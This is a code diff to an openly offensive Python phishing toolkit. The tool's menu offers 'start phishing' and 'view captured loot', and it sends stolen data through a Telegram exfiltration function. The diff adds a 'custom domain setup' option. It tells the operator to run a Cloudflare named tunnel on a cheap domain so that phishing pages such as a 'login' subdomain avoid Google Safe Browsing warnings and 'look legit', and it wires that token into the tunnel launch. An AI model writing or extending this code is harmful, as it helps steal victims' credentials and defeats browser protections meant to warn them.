@@ -124,7 +124,8 @@ def load_config():
     if os.path.exists(CONF_FILE):
         with open(CONF_FILE) as f:
             return json.load(f)
-    return {"tg_token": "", "tg_chatid": ""}
+    return {"tg_token": "", "tg_chatid": "",
+            "cf_tunnel_token": "", "cf_public_host": ""}
 
 def save_config(cfg):
     with open(CONF_FILE, "w") as f:
@@ -168,6 +169,29 @@ def telegram_exfil(data):
                   "parse_mode": "Markdown"}, timeout=10)
     except Exception:
         pass
+
+def setup_custom_domain():
+    cfg = load_config()
+    print(f"\n{C}[*] custom domain tunnel setup{N}")
+    print(f"{D}    why: trycloudflare.com is flagged by google safe browsing.")
+    print(f"    a named tunnel on YOUR domain = zero warnings, looks legit.{N}\n")
+    print(f"{Y}    how to get a token (5 min, free):{N}")
+    print(f"    1. get a cheap/free domain (pp.ua, eu.org, or $1 registrars)")
+    print(f"    2. add it to a free cloudflare account (change nameservers)")
+    print(f"    3. cloudflare dashboard → networks → tunnels → add tunnel")
+    print(f"    4. copy the token from the install command they show")
+    print(f"    5. set a public hostname pointing to http://localhost:8080\n")
+    token = input(f"{W}[?] tunnel token {D}[{'set' if cfg.get('cf_tunnel_token') else 'none'}] (blank to clear){N} > ").strip()
+    host  = input(f"{W}[?] public hostname {D}[{cfg.get('cf_public_host') or 'ex: login.seudominio.com'}]{N} > ").strip()
+    cfg["cf_tunnel_token"] = token
+    if host:
+        cfg["cf_public_host"] = host
+    save_config(cfg)
+    if token and cfg.get("cf_public_host"):
+        print(f"{G}[+] saved — next run uses https://{cfg['cf_public_host']} (no safe browsing warning){N}\n")
+    else:
+        print(f"{Y}[+] cleared — back to random trycloudflare.com urls{N}\n")
+    time.sleep(2)
 
 # ---------- flask routes ----------
 @app.route("/", methods=["GET", "POST"])
@@ -223,6 +247,12 @@ def tunnel_cmd(backend, port):
         ]
         for bin_ in cands:
             if bin_ and os.path.exists(bin_):
+                cfg = load_config()
+                if cfg.get("cf_tunnel_token"):
+                    # named tunnel on YOUR domain — clean reputation,
+                    # no safe browsing warning (unlike trycloudflare.com)
+                    return [bin_, "tunnel", "run", "--token",
+                            cfg["cf_tunnel_token"], "--no-autoupdate"]
                 return [bin_, "tunnel", "--url", f"http://localhost:{port}",
                         "--no-autoupdate"]
     elif backend == "localhost.run":
@@ -250,10 +280,12 @@ URL_PATTERNS = [
 ]
 
 def spawn_tunnel(backend, port):
-    """try one backend, return url or None"""
+    """try one backend, return (url, proc) or (None, reason)"""
     cmd = tunnel_cmd(backend, port)
     if not cmd:
         return None, "not installed"
+    cfg = load_config()
+    named = backend == "cloudflared" and cfg.get("cf_tunnel_token")
     done = threading.Event()
     t = threading.Thread(target=spinner,
                          args=(f"trying {backend} on :{port}...", done),
@@ -282,6 +314,13 @@ def spawn_tunnel(backend, port):
                 break
             continue
         raw.append(line.rstrip())
+        # named tunnel: no url in output — confirm registration, use configured host
+        if named and ("Registered tunnel connection" in line or "connection" in line and "registered" in line.lower()):
+            if cfg.get("cf_public_host"):
+                url_found = cfg["cf_public_host"].rstrip("/")
+                if not url_found.startswith("http"):
+                    url_found = "https://" + url_found
+                break
         for pat in URL_PATTERNS:
             m = re.search(pat, line)
             if m:
@@ -408,6 +447,7 @@ def menu_screen():
     print(f"  {C}│{N}  {W}[1]{N} 🎣 start phishing        {C}│{N}")
     print(f"  {C}│{N}  {W}[2]{N} 🤖 telegram config       {C}│{N}")
     print(f"  {C}│{N}  {W}[3]{N} 💰 view captured loot    {C}│{N}")
+    print(f"  {C}│{N}  {W}[4]{N} 🌐 custom domain setup   {C}│{N}")
     print(f"  {C}│{N}  {W}[0]{N} 👋 exit                  {C}│{N}")
     print(f"  {C}└─────────────────────────────┘{N}\n")
     return input(f"{Y}[?] select > {N}").strip()
@@ -426,6 +466,8 @@ def main():
             setup_telegram(); continue
         if opt == "3":
             view_loot(); continue
+        if opt == "4":
+            setup_custom_domain(); continue
         if opt == "0":
             print(f"\n{M}[*] nyx out. happy hunting.{N}\n")
             sys.exit(0)
